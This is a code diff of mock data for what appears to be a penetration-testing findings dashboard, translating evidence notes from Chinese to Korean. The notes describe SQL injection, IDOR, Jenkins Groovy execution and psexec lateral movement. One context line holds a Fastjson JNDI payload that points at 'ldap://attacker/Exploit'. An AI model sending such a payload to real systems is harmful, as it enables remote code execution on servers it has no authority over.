@@ -66,20 +66,20 @@ interface MockBindingSeed {
 // 每条漏洞预置的流量证据(finding id → 绑定的抓包)。选取与漏洞语义对应的请求,
 // 让 demo 详情页的「关联流量」区块看起来真实。
 const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
-  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 파라미터 인젝션 payload 로 응답에 MSSQL 오류가 에코됐다." }],
   "f-2": [
-    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
-    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+    { traffic_id: "x-8", role: "baseline", note: "본인 주문 id=1001, 정상 대조군으로 사용했다." },
+    { traffic_id: "x-9", role: "proof", note: "id=1002 로 바꿔 권한 우회로 타인의 주문을 읽어냈다." },
   ],
   "f-12": [
-    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
-    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload 로 역방향 연결을 유발했다." },
+    { traffic_id: "x-16", role: "verification", note: "두 번째 요청으로 명령 실행이 성립했음을 확인했다." },
   ],
   "f-15": [
-    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
-    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 에 미인증으로 접근 가능하다." },
+    { traffic_id: "x-18", role: "proof", note: "scriptText 로 Groovy 명령을 실행해 SYSTEM 을 반환받았다." },
   ],
-  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 로 svc_deploy 계정을 사용해 도메인 컨트롤러 DC01 에 로그인했다." }],
 };
 
 // demo 用固定报文正文,避免详情页 Request/Response 空白。
@@ -91,7 +91,7 @@ const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
   "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
   "x-9": {
     req: "",
-    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"서울시 강남구 ****","phone":"138****6021"}',
   },
   "x-15": {
     req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
